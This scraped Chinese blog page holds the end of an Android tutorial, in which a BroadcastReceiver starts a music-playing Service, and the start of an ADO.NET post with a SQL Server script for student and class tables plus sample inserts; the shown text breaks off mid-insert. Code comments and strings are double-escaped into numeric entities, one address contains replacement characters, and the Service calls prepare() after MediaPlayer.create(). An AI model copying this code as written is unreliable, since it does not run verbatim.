</code></pre><p>&#x4E0A;&#x9762;&#x5C31;&#x662F;&#x5B9A;&#x4E49;&#x4E00;&#x4E2A;&#x5E7F;&#x64AD;&#x63A5;&#x6536;&#x7C7B;&#xFF0C;&#x5B83;&#x7EE7;&#x627F;&#x4E8E;BroadcastReceiver,&#x5728;&#x5176;&#x4E2D;&#x5B8C;&#x6210;&#x4E00;&#x4E9B;&#x76F8;&#x5E94;&#x7684;&#x64CD;&#x4F5C;…. </p>
<pre><code><span class="keyword">package</span> com.example.broadcast_receiver;
<span class="keyword">import</span> android.os.Bundle;
<span class="keyword">import</span> android.app.Activity;
<span class="keyword">import</span> android.view.Menu;
<span class="keyword">import</span> android.view.View;
<span class="keyword">import</span> android.view.View.OnClickListener;
<span class="keyword">import</span> android.content.Intent;
<span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span> <span class="keyword">implements</span> <span class="title">View</span>.<span class="title">OnClickListener</span> </span>{
    <span class="keyword">private</span> Intent intent=<span class="keyword">new</span> Intent(Intent.ACTION_EDIT);
    <span class="annotation">@Override</span>
    <span class="keyword">protected</span> <span class="function"><span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>{
        <span class="keyword">super</span>.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        findViewById(R.id.broadcast).setOnClickListener(<span class="keyword">this</span>);
    }
    <span class="annotation">@Override</span>
    <span class="keyword">public</span> <span class="function"><span class="keyword">boolean</span> <span class="title">onCreateOptionsMenu</span><span class="params">(Menu menu)</span> </span>{
        <span class="comment">// Inflate the menu; this adds items to the action bar if it is present.</span>
        getMenuInflater().inflate(R.menu.main, menu);
        <span class="keyword">return</span> <span class="keyword">true</span>;
    }
    <span class="annotation">@Override</span>
    <span class="keyword">public</span> <span class="function"><span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>{
        <span class="comment">// <span class="doctag">TODO</span> Auto-generated method stub</span>
        <span class="keyword">switch</span> (v.getId()) {
        <span class="keyword">case</span> R.id.broadcast:
            intent.putExtra(&amp;quot;msg&amp;quot;, &amp;quot;aa&amp;quot;);
            MainActivity.<span class="keyword">this</span>.sendBroadcast(intent);
            <span class="keyword">break</span>;
        }
    }
}
</code></pre><p>&#x8FD9;&#x4E2A;&#x5C31;&#x662F;&#x5982;&#x4F55;&#x5728;MainActivity&#x4E2D;&#x8C03;&#x7528;&#x5E7F;&#x64AD;&#x63A5;&#x6536;&#x8005;&#xFF0C;&#x5F88;&#x7B80;&#x5355;&#x7684;&#x4E00;&#x4E2A;&#x52A8;&#x4F5C;&#xFF0C;&#x5C31;&#x662F;&#x89E6;&#x53D1;&#x6309;&#x94AE;&#xFF0C;&#x7136;&#x540E;&#x4F1A;&#x5728;&#x5C4F;&#x5E55;&#x4E0A;&#x8F93;&#x51FA;&quot;aa&quot;&#x8FD9;&#x6761;&#x4FE1;&#x606F;…&#x5F88;&#x7B80;&#x5355;&#x7684;&#x4E00;&#x4E2A;&#x64CD;&#x4F5C;&#xFF0C;&#x5E03;&#x5C40;&#x6587;&#x4EF6;&#x5C31;&#x4E00;&#x4E2A;&#x6309;&#x94AE;&#xFF0C;&#x6CA1;&#x5FC5;&#x8981;&#x53BB;&#x7C98;&#x8D34;…&#x91CD;&#x8981;&#x7684;&#x662F;&#x7406;&#x89E3;&#x4E00;&#x4E0B;&#x8FD9;&#x4E2A;&#x8FC7;&#x7A0B;&#xFF0C;&#x4E0D;&#x8981;&#x5FD8;&#x4E86;&#x4F7F;&#x7528;BroadcastReceiver&#x65F6;&#x4E00;&#x5B9A;&#x8981;&#x8FDB;&#x884C;&#x6CE8;&#x518C;&#xFF0C;&#x5426;&#x5219;&#x662F;&#x4E0D;&#x80FD;&#x8FDB;&#x884C;&#x4F7F;&#x7528;&#x7684;…. </p>
<h4 id="2-&#x5982;&#x4F55;&#x4F7F;&#x7528;BroadcastReceiver&#x53BB;&#x542F;&#x52A8;Service…">2.&#x5982;&#x4F55;&#x4F7F;&#x7528;BroadcastReceiver&#x53BB;&#x542F;&#x52A8;Service…</h4><p>&#x524D;&#x9762;&#x5DF2;&#x7ECF;&#x8BF4;&#x8FC7;&#xFF0C;BroadcastReceiver&#x5BF9;&#x8C61;&#x7684;&#x751F;&#x547D;&#x5468;&#x671F;&#x662F;&#x975E;&#x5E38;&#x77ED;&#x6682;&#x7684;…&#x90A3;&#x4E48;&#x8017;&#x65F6;&#x7684;&#x52A8;&#x4F5C;&#x662F;&#x65E0;&#x6CD5;&#x5728;&#x8FD9;&#x91CC;&#x6267;&#x884C;&#x7684;&#xFF0C;&#x4F46;&#x662F;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5728;BroadcastReceiver&#x4E2D;&#x53BB;&#x8C03;&#x7528;Service…&#x8BA9;Service&#x53BB;&#x6267;&#x884C;&#x8017;&#x65F6;&#x7684;&#x670D;&#x52A1;…&#x7B80;&#x5355;&#x7684;&#x4ECB;&#x7ECD;&#x4E00;&#x4E0B;&#x5982;&#x4F55;&#x53BB;&#x542F;&#x52A8;Service…</p>
<h4 id="i-&#x9996;&#x5148;&#x6211;&#x4EEC;&#x5148;&#x5B9A;&#x4E49;&#x4E00;&#x4E2A;Service…">i.&#x9996;&#x5148;&#x6211;&#x4EEC;&#x5148;&#x5B9A;&#x4E49;&#x4E00;&#x4E2A;Service…</h4><pre><code><span class="keyword">package</span> com.example.broadcast_receiver;
<span class="keyword">import</span> android.app.Service;
<span class="keyword">import</span> android.content.Intent;
<span class="keyword">import</span> android.media.MediaPlayer;
<span class="keyword">import</span> android.os.IBinder;
<span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyService</span> <span class="keyword">extends</span> <span class="title">Service</span></span>{
    <span class="keyword">private</span> MediaPlayer media;
    <span class="annotation">@Override</span>
    <span class="function"><span class="keyword">public</span> IBinder <span class="title">onBind</span><span class="params">(Intent intent)</span> </span>{
        <span class="comment">// <span class="doctag">TODO</span> Auto-generated method stub</span>
        <span class="keyword">return</span> <span class="keyword">null</span>;
    }
    <span class="annotation">@Override</span>
    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">()</span></span>{
        <span class="keyword">super</span>.onCreate();
        media=MediaPlayer.create(MyService.<span class="keyword">this</span>, R.raw.a);
        MyService.<span class="keyword">this</span>.media.prepare();
        MyService.<span class="keyword">this</span>.media.start();
        media.setLooping(<span class="keyword">true</span>);
    }
    <span class="annotation">@Override</span>
    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onDestroy</span><span class="params">()</span></span>{
        <span class="keyword">super</span>.onDestroy();
    }
    <span class="annotation">@Override</span>
    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onStart</span><span class="params">(Intent intent,<span class="keyword">int</span> startId)</span></span>{
        <span class="keyword">super</span>.onStart(intent, startId);
    }
}
</code></pre><p>&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x590D;&#x5236;&#x4E00;&#x9996;&#x6B4C;&#x66F2;&#x5230;res\raw&#x6587;&#x4EF6;&#x5939;&#x4E0B;&#x4E00;&#x9996;&#x6B4C;&#x66F2;…raw&#x6587;&#x4EF6;&#x5939;&#x6211;&#x4EEC;&#x81EA;&#x5DF1;&#x8FDB;&#x884C;&#x65B0;&#x5EFA;… </p>
<pre><code><span class="keyword">package</span> com.example.broadcast_receiver;
<span class="keyword">import</span> android.content.<span class="type">BroadcastReceiver</span>;
<span class="keyword">import</span> android.content.<span class="type">Context</span>;
<span class="keyword">import</span> android.content.<span class="type">Intent</span>;
<span class="keyword">import</span> android.widget.<span class="type">Toast</span>;
public <span class="class"><span class="keyword">class</span> <span class="title">MyBroadcast</span> <span class="keyword"><span class="keyword">extends</span></span> <span class="title">BroadcastReceiver</span>{</span>
    <span class="annotation">@Override</span>
    public void onReceive(<span class="type">Context</span> context, <span class="type">Intent</span> intent) {
        <span class="comment">// <span class="doctag">TODO</span> Auto-generated method stub</span>
        <span class="type">Intent</span> newintent =<span class="keyword">new</span> <span class="type">Intent</span>(context,<span class="type">MyService</span>.<span class="keyword">class</span>);
        context.startService(newintent);
        <span class="type">String</span> str=intent.getStringExtra(&amp;quot;msg&amp;quot;);
        <span class="type">Toast</span>.makeText(context, str, <span class="type">Toast</span>.<span class="type">LENGTH_SHORT</span>).show();
    }  
}
</code></pre><p>&#x8FD9;&#x4E2A;&#x662F;&#x5E7F;&#x64AD;&#x7C7B;&#xFF0C;&#x4ECE;&#x5E7F;&#x64AD;&#x7684;&#x5185;&#x90E8;&#x53BB;&#x542F;&#x52A8;Service…..&#x7136;&#x540E;&#x5728;AndroidManifest.xml&#x6587;&#x4EF6;&#x4E2D;&#x7684;&lt;application&gt;&#x548C;&lt;/application&gt;&#x4E4B;&#x95F4;&#x52A0;&#x5165;&#x4EE3;&#x7801;&lt;service android:name=&quot;.MyService&quot; android:enable=&quot;true&quot;/&gt;&#x5C31;&#x641E;&#x5B9A;&#x4E86;… </p>
<h4 id="&#x8FD9;&#x6837;&#x5C31;&#x5B8C;&#x6210;&#x4E86;&#x5728;BroadcastReceiver()&#x5185;&#x90E8;&#x53BB;&#x542F;&#x52A8;Service…-">&#x8FD9;&#x6837;&#x5C31;&#x5B8C;&#x6210;&#x4E86;&#x5728;BroadcastReceiver()&#x5185;&#x90E8;&#x53BB;&#x542F;&#x52A8;Service…..</h4><p>&#x8D5E;&#x4E00;&#x4E2A; &#x6536; &#x85CF; </p>
<p> &#x63A8;&#x8350;&#x6587;&#x7AE0;</p>
<ul>
<li>1.<a href="/articles/Ajimq2">android&#x81EA;&#x5B9A;&#x4E49;&#x63A7;&#x4EF6;&#x5B9E;&#x73B0;TextView&#x6309;&#x4E0B;&#x540E;&#x5B57;&#x4F53;&#x989C;&#x8272;&#x6539;&#x53D8;</a></li>
<li>2.<a href="/articles/ZVBJZb">Android UI: LinearLayout&#x4E2D;layout_weight &#x5C5E;&#x6027;&#x7684;&#x4F7F;&#x7528;&#x89C4;&#x5219;</a></li>
<li>3.<a href="/articles/qa2Urqz">Android&#xFF1A;&#x52A0;&#x8F7D;Android Design Support Library&#x5F02;&#x5E38;&#x89E3;&#x51B3;&#x65B9;&#x6848;</a></li>
<li>4.<a href="/articles/zmAnyyn">&#x817E;&#x8BAF;&#x79FB;&#x52A8;&#x6027;&#x80FD;&#x8BC4;&#x6D4B;&#x4E13;&#x5BB6;&#x53F6;&#x65B9;&#x6B63;&#xFF1A;Android&#x4F18;&#x5316;&#x7B14;&#x8BB0;</a></li>
<li>5.<a href="/articles/2qIZ736">Android &#x5B66;&#x4E60;&#x7B14;&#x8BB0; Service&#x670D;&#x52A1;&#x4E0E;&#x8FDC;&#x7A0B;&#x901A;&#x4FE1;…&#xFF08;AIDL&#xFF09;</a></li>
<li><p>6.<a href="/articles/Nf2EzeY">android&#x56FD;&#x9645;&#x5316;&#x64CD;&#x4F5C;</a></p>
<p>&#x76F8;&#x5173;&#x5FAE;&#x535A; <a href="/articles/weibo_list/An2Ejmn">()</a></p>
</li>
</ul>
<h5 id="&#x6211;&#x6765;&#x8BC4;&#x51E0;&#x53E5;">&#x6211;&#x6765;&#x8BC4;&#x51E0;&#x53E5;</h5><p>&#x9519;&#x8BEF; </p>
<p> &#x767B;&#x5F55;&#x540E;&#x8BC4;&#x8BBA; &#x5DF2;&#x53D1;&#x8868;&#x8BC4;&#x8BBA;&#x6570;( ) </p>
<p>&#x6CA1;&#x6709;&#x66F4;&#x591A;&#x8BC4;&#x8BBA;&#x4E86;^^ </p>
<p>&#x66F4;&#x591A;&#x8BC4;&#x8BBA;</p>
<p>&#x8BC4;&#x8BBA;&#x52A0;&#x8F7D;&#x5931;&#x8D25;&#xFF0C;<a href="javascript:reload_comments(&apos;An2Ejmn&apos;,1,0,-1);" target="_blank" rel="external">&#x91CD;&#x65B0;&#x52A0;&#x8F7D;</a></p>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/transcribe/">transcribe</a>
</div>


  <div class="article-tags">
  
  <span></span> <a href="/tags/BroadcastReceiver/">BroadcastReceiver</a>
  </div>

</div>




<div class="comments-count">
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand post" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2015/06/07/666e5a1/" title="ADO.NET学习系列（二） -" itemprop="url">ADO.NET学习系列（二） -</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="edwin" target="_blank" itemprop="author">edwin</a>
		
  <p class="article-time">
    <time datetime="2015-06-06T22:24:37.000Z" itemprop="datePublished"> 发表于 2015-06-07</time>
    
  </p>
</header>
    <div class="article-content">
        
        <h1 id="ADO-NET&#x5B66;&#x4E60;&#x7CFB;&#x5217;&#xFF08;&#x4E8C;&#xFF09;">ADO.NET&#x5B66;&#x4E60;&#x7CFB;&#x5217;&#xFF08;&#x4E8C;&#xFF09;</h1><p> &#x65F6;&#x95F4;&#xA0;2015-06-07 11:15:00  <a href="/sites/ZVBBzq">&#x535A;&#x5BA2;&#x56ED;-.NET&#x65B0;&#x624B;&#x533A;</a></p>
<p><em>&#x539F;&#x6587;</em>&#xA0; <a href="http://www.cnblogs.com/caofangsheng/p/4558138.html?utm_source=tuicool" target="_blank" rel="external">http://www.cnblogs.com/caofangsheng/p/4558138.html</a></p>
<p> &#x4E3B;&#x9898; <a href="/topics/11000064">&#x6570;&#x636E;&#x5E93;</a></p>
<p>&#x8FD9;&#x6B21;&#x6211;&#x4F7F;&#x7528;ADO.NET&#x6765;&#x63D2;&#x5165;&#x4E00;&#x6761;&#x6570;&#x636E;&#xFF0C;&#x5230;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x3002;&#x4E3B;&#x7528;&#x5230;&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&#x3002;&#x6211;&#x4E0D;&#x60F3;&#x6BCF;&#x6B21;&#x90FD;&#x662F;&#x7528;SQL&#x6587;&#x672C;&#x7684;&#x5F62;&#x5F0F;&#x4E86;&#xFF0C;&#x90A3;&#x6837;&#x59CB;&#x7EC8;&#x6CA1;&#x6709;&#x8FDB;&#x6B65;&#xFF5E;&#xFF5E;&#xFF5E;</p>
<p>&#x4E0B;&#x9762;&#x9996;&#x5148;&#xFF0C;&#x6211;&#x628A;&#x6211;&#x8FD9;&#x6B21;&#x7EC3;&#x4E60;&#x8981;&#x7528;&#x5230;&#x7684;&#x6570;&#x636E;&#x5E93;&#x811A;&#x672C;&#xFF0C;&#x8D34;&#x51FA;&#x6765;&#xFF1A;</p>
<p><img src="http://img1.tuicool.com/7JJJry.gif" alt=""></p>
<pre><code> <span class="number">1</span> USE master    --&amp;<span class="array">#x</span>4F7F;&amp;<span class="array">#x</span>7528;&amp;<span class="array">#x</span>7CFB;&amp;<span class="array">#x</span>7EDF;&amp;<span class="array">#x</span>6570;&amp;<span class="array">#x</span>636E;&amp;<span class="array">#x</span>5E93;
 <span class="number">2</span> GO
 <span class="number">3</span> <span class="keyword">IF</span> EXISTS(<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> sysdatabases WHERE name=N&amp;apos;DB_MyStudentLife&amp;apos;)   
 <span class="number">4</span> DROP DATABASE [DB_MyStudentLife];  --&amp;<span class="array">#x</span>5982;&amp;<span class="array">#x</span>679C;&amp;<span class="array">#x</span>8981;&amp;<span class="array">#x</span>521B;&amp;<span class="array">#x</span>5EFA;&amp;<span class="array">#x</span>7684;&amp;<span class="array">#x</span>6570;&amp;<span class="array">#x</span>636E;&amp;<span class="array">#x</span>5E93;&amp;<span class="array">#x</span>5B58;&amp;<span class="array">#x</span>5728;&amp;<span class="array">#x</span>7684;&amp;<span class="array">#x</span>8BDD;&amp;<span class="array">#xFF</span>0C;&amp;<span class="array">#x</span>5C31;&amp;<span class="array">#x</span>5220;&amp;<span class="array">#x</span>9664;
 <span class="number">5</span> GO
 <span class="number">6</span> CREATE DATABASE [DB_MyStudentLife] --&amp;<span class="array">#x</span>521B;&amp;<span class="array">#x</span>5EFA;&amp;<span class="array">#x</span>6570;&amp;<span class="array">#x</span>636E;&amp;<span class="array">#x</span>5E93;
 <span class="number">7</span> GO
 <span class="number">8</span> USE [DB_MyStudentLife]       --&amp;<span class="array">#x</span>4F7F;&amp;<span class="array">#x</span>7528;&amp;<span class="array">#x</span>6570;&amp;<span class="array">#x</span>636E;&amp;<span class="array">#x</span>5E93;
 <span class="number">9</span> GO
<span class="number">10</span> <span class="keyword">IF</span> EXISTS(<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> sysobjects WHERE name=N&amp;apos;MyClass&amp;apos;)
<span class="number">11</span> DROP <span class="keyword">TABLE</span> [MyClass]           --&amp;<span class="array">#x</span>5982;&amp;<span class="array">#x</span>679C;&amp;<span class="array">#x</span>8981;&amp;<span class="array">#x</span>521B;&amp;<span class="array">#x</span>5EFA;&amp;<span class="array">#x</span>7684;&amp;<span class="array">#x</span>6570;&amp;<span class="array">#x</span>636E;&amp;<span class="array">#x</span>8868;&amp;<span class="array">#x</span>5B58;&amp;<span class="array">#x</span>5728;&amp;<span class="array">#x</span>7684;&amp;<span class="array">#x</span>8BDD;&amp;<span class="array">#xFF</span>0C;&amp;<span class="array">#x</span>5C31;&amp;<span class="array">#x</span>5220;&amp;<span class="array">#x</span>9664;(&amp;<span class="array">#x</span>6CE8;&amp;<span class="array">#x</span>610F;sysobjects&amp;<span class="array">#xFF</span>0C;&amp;<span class="array">#x</span>4E00;&amp;<span class="array">#x</span>5B9A;&amp;<span class="array">#x</span>8981;&amp;<span class="array">#x</span>5168;&amp;<span class="array">#x</span>90E8;&amp;<span class="array">#x</span>662F;&amp;<span class="array">#x</span>5C0F;&amp;<span class="array">#x</span>5199;&amp;<span class="array">#x</span>7684;&amp;<span class="array">#xFF</span>0C;&amp;<span class="array">#x</span>4E0D;&amp;<span class="array">#x</span>7136;&amp;<span class="array">#x</span>6709;&amp;<span class="array">#x</span>9519;&amp;<span class="array">#x</span>8BEF;&amp;<span class="array">#xFF</span>0C;&amp;<span class="array">#x</span>4E0D;&amp;<span class="array">#x</span>80FD;&amp;<span class="array">#x</span>5199;&amp;<span class="array">#x</span>6210;&amp;<span class="array">#x</span>5927;&amp;<span class="array">#x</span>5199;&amp;<span class="array">#x</span>7684;&amp;<span class="array">#x</span>3002;)
<span class="number">12</span> GO
<span class="number">13</span> CREATE <span class="keyword">TABLE</span> MyClass                                --&amp;<span class="array">#x</span>521B;&amp;<span class="array">#x</span>5EFA;&amp;<span class="array">#x</span>6570;&amp;<span class="array">#x</span>636E;&amp;<span class="array">#x</span>8868;
<span class="number">14</span> (
<span class="number">15</span>     C_ID INT NOT NULL PRIMARY KEY,               --&amp;<span class="array">#x</span>73ED;&amp;<span class="array">#x</span>7EA7;&amp;<span class="array">#x</span>7F16;&amp;<span class="array">#x</span>53F7;
<span class="number">16</span>     C_Name NVARCHAR(<span class="number">200</span>) not null,               --&amp;<span class="array">#x</span>73ED;&amp;<span class="array">#x</span>7EA7;&amp;<span class="array">#x</span>540D;&amp;<span class="array">#x</span>79F0;
<span class="number">17</span>     C_Descr nvarchar(max) not null               --&amp;<span class="array">#x</span>73ED;&amp;<span class="array">#x</span>7EA7;&amp;<span class="array">#x</span>7B80;&amp;<span class="array">#x</span>4ECB;
<span class="number">18</span>  
<span class="number">19</span> );
<span class="number">20</span> GO
<span class="number">21</span> <span class="keyword">IF</span> EXISTS(<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> sysobjects WHERE name=N&amp;apos;MyStudent&amp;apos;)
<span class="number">22</span> DROP <span class="keyword">TABLE</span> MyStudent
<span class="number">23</span> GO
<span class="number">24</span> CREATE <span class="keyword">TABLE</span> MyStudent
<span class="number">25</span> (
<span class="number">26</span> S_ID int not null primary key,   --&amp;<span class="array">#x</span>5B66;&amp;<span class="array">#x</span>53F7;
<span class="number">27</span> S_Name nvarchar(<span class="number">50</span>) not null,                  --&amp;<span class="array">#x</span>59D3;&amp;<span class="array">#x</span>540D;
<span class="number">28</span> S_Gender char(<span class="number">2</span>) not null,                     --&amp;<span class="array">#x</span>6027;&amp;<span class="array">#x</span>522B;
<span class="number">29</span> S_Address nvarchar(max) not null ,             --&amp;<span class="array">#x</span>5730;&amp;<span class="array">#x</span>5740;
<span class="number">30</span> S_Phone nvarchar(<span class="number">50</span>)not null,                  --&amp;<span class="array">#x</span>7535;&amp;<span class="array">#x</span>8BDD;
<span class="number">31</span> S_Age int not null,                            --&amp;<span class="array">#x</span>5E74;&amp;<span class="array">#x</span>9F84;
<span class="number">32</span> S_Birthday datetime not null,                  --&amp;<span class="array">#x</span>751F;&amp;<span class="array">#x</span>65E5;
<span class="number">33</span> S_CardID int not null,                         --&amp;<span class="array">#x</span>8EAB;&amp;<span class="array">#x</span>4EFD;&amp;<span class="array">#x</span>8BC1;&amp;<span class="array">#x</span>53F7;&amp;<span class="array">#x</span>7801;
<span class="number">34</span> S_CID  int not null references MyClass(C_ID)   --&amp;<span class="array">#x</span>73ED;&amp;<span class="array">#x</span>7EA7;&amp;<span class="array">#x</span>7F16;&amp;<span class="array">#x</span>53F7;
<span class="number">35</span> 
<span class="number">36</span> );
</code></pre><p> &#x521B;&#x5EFA;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x521B;&#x5EFA;&#x6570;&#x636E;&#x8868;&#x8BED;&#x53E5;</p>
<p>&#x63A5;&#x7740;&#x5927;&#x5BB6;&#x9009;&#x4E2D;&#x521A;&#x624D;&#x6267;&#x884C;&#x811A;&#x672C;&#xFF0C;&#x521B;&#x5EFA;&#x597D;&#x7684;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x7136;&#x540E;&#x4F7F;&#x7528;&#x6211;&#x4E0B;&#x9762;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x5411;&#x6570;&#x636E;&#x5E93;&#x8868;&#x91CC;&#x9762;&#x6DFB;&#x52A0;&#x6570;&#x636E;&#x5427;</p>
<p><img src="http://img1.tuicool.com/7JJJry.gif" alt=""></p>
<pre><code> <span class="number">1</span> insert <span class="keyword">into</span> MyClass(C_ID,C_Name,C_Descr)values(<span class="number">1</span>,<span class="subst">&amp;</span>apos;<span class="subst">&amp;</span><span class="variable">#x8F6F</span>;<span class="subst">&amp;</span><span class="variable">#x4EF6</span>;<span class="number">1108</span><span class="subst">&amp;</span><span class="variable">#x73ED</span>;<span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="subst">&amp;</span><span class="variable">#x6B66</span>;<span class="subst">&amp;</span><span class="variable">#x6C49</span>;<span class="subst">&amp;</span><span class="variable">#x8F6F</span>;<span class="subst">&amp;</span><span class="variable">#x4EF6</span>;<span class="subst">&amp;</span><span class="variable">#x5DE5</span>;<span class="subst">&amp;</span><span class="variable">#x7A0B</span>;<span class="subst">&amp;</span><span class="variable">#x804C</span>;<span class="subst">&amp;</span><span class="variable">#x4E1A</span>;<span class="subst">&amp;</span><span class="variable">#x5B66</span>;<span class="subst">&amp;</span><span class="variable">#x9662</span>;<span class="subst">&amp;</span>apos;);
 <span class="number">2</span> insert <span class="keyword">into</span> MyClass(C_ID,C_Name,C_Descr)values(<span class="number">2</span>,<span class="subst">&amp;</span>apos;<span class="subst">&amp;</span><span class="variable">#x8F6F</span>;<span class="subst">&amp;</span><span class="variable">#x4EF6</span>;<span class="number">1107</span><span class="subst">&amp;</span><span class="variable">#x73ED</span>;<span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="subst">&amp;</span><span class="variable">#x6B66</span>;<span class="subst">&amp;</span><span class="variable">#x6C49</span>;<span class="subst">&amp;</span><span class="variable">#x8F6F</span>;<span class="subst">&amp;</span><span class="variable">#x4EF6</span>;<span class="subst">&amp;</span><span class="variable">#x5DE5</span>;<span class="subst">&amp;</span><span class="variable">#x7A0B</span>;<span class="subst">&amp;</span><span class="variable">#x804C</span>;<span class="subst">&amp;</span><span class="variable">#x4E1A</span>;<span class="subst">&amp;</span><span class="variable">#x5B66</span>;<span class="subst">&amp;</span><span class="variable">#x9662</span>;<span class="subst">&amp;</span>apos;);
 <span class="number">3</span> insert <span class="keyword">into</span> MyClass(C_ID,C_Name,C_Descr)values(<span class="number">3</span>,<span class="subst">&amp;</span>apos;<span class="subst">&amp;</span><span class="variable">#x5B9E</span>;<span class="subst">&amp;</span><span class="variable">#x9A8C</span>;<span class="subst">&amp;</span><span class="variable">#x73ED</span>;<span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="subst">&amp;</span><span class="variable">#x6B66</span>;<span class="subst">&amp;</span><span class="variable">#x6C49</span>;<span class="subst">&amp;</span><span class="variable">#x8F6F</span>;<span class="subst">&amp;</span><span class="variable">#x4EF6</span>;<span class="subst">&amp;</span><span class="variable">#x5DE5</span>;<span class="subst">&amp;</span><span class="variable">#x7A0B</span>;<span class="subst">&amp;</span><span class="variable">#x804C</span>;<span class="subst">&amp;</span><span class="variable">#x4E1A</span>;<span class="subst">&amp;</span><span class="variable">#x5B66</span>;<span class="subst">&amp;</span><span class="variable">#x9662</span>;<span class="subst">&amp;</span>apos;);
 <span class="number">4</span> 
 <span class="number">5</span> 
 <span class="number">6</span> insert <span class="keyword">into</span> MyStudent(S_ID,S_Name,S_Gender,S_Age,S_Birthday,S_CardID,S_Phone,S_Address,S_CID)values(<span class="subst">&amp;</span>apos;<span class="number">1</span><span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="subst">&amp;</span><span class="variable">#x674E</span>;<span class="subst">&amp;</span><span class="variable">#x56DB</span>;<span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="subst">&amp;</span><span class="variable">#x7537</span>;<span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="number">22</span><span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="number">1992</span><span class="subst">-</span><span class="number">09</span><span class="subst">-</span><span class="number">26</span><span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="number">111111111</span><span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="number">11232131234</span><span class="subst">&amp;</span>apos;,N<span class="subst">&amp;</span>apos;<span class="subst">&amp;</span><span class="variable">#x6DF1</span>;<span class="subst">&amp;</span><span class="variable">#x5733</span>;<span class="subst">&amp;</span><span class="variable">#x5B9D</span>;<span class="subst">&amp;</span><span class="variable">#x5B89</span>;<span class="subst">&amp;</span><span class="variable">#x77F3</span>;<span class="subst">&amp;</span><span class="variable">#x5CA9</span>;<span class="subst">&amp;</span>apos;,<span class="number">1</span>);
 <span class="number">7</span> insert <span class="keyword">into</span> MyStudent(S_ID,S_Name,S_Gender,S_Age,S_Birthday,S_CardID,S_Phone,S_Address,S_CID)values(<span class="subst">&amp;</span>apos;<span class="number">2</span><span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="subst">&amp;</span><span class="variable">#x674E</span>;<span class="subst">&amp;</span><span class="variable">#x56DB</span>;<span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="subst">&amp;</span><span class="variable">#x7537</span>;<span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="number">22</span><span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="number">1992</span><span class="subst">-</span><span class="number">09</span><span class="subst">-</span><span class="number">26</span><span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="number">111111111</span><span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="number">11232131234</span><span class="subst">&amp;</span>apos;,N<span class="subst">&amp;</span>apos;<span class="subst">&amp;</span><span class="variable">#x6DF1</span>;<span class="subst">&amp;</span><span class="variable">#x5733</span>;<span class="subst">&amp;</span><span class="variable">#x5B9D</span>;<span class="subst">&amp;</span><span class="variable">#x5B89</span>;<span class="subst">&amp;</span><span class="variable">#x77F3</span>;<span class="subst">&amp;</span><span class="variable">#x5CA9</span>;<span class="subst">&amp;</span>apos;,<span class="number">1</span>);
 <span class="number">8</span> insert <span class="keyword">into</span> MyStudent(S_ID,S_Name,S_Gender,S_Age,S_Birthday,S_CardID,S_Phone,S_Address,S_CID)values(<span class="subst">&amp;</span>apos;<span class="number">3</span><span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="subst">&amp;</span><span class="variable">#x674E</span>;<span class="subst">&amp;</span><span class="variable">#x56DB</span>;<span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="subst">&amp;</span><span class="variable">#x7537</span>;<span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="number">22</span><span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="number">1992</span><span class="subst">-</span><span class="number">09</span><span class="subst">-</span><span class="number">26</span><span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="number">111111111</span><span class="subst">&amp;</span>apos;,<span class="subst">&amp;</span>apos;<span class="number">11232131234</span><span class="subst">&amp;</span>apos;,N<span class="subst">&amp;</span>apos;<span class="subst">&amp;</span><span class="variable">#x6DF1</span>;<span class="subst">&amp;</span><span class="variable">#xFFFD</span>;<span class="subst">&amp;</span><span class="variable">#xFFFD</span>;<span class="subst">&amp;</span><span class="variable">#xFFFD</span>;<span class="subst">&amp;</span><span class="variable">#x5B9D</span>;<span class="subst">&amp;</span><span class="variable">#x5B89</span>;<span class="subst">&amp;</span><span 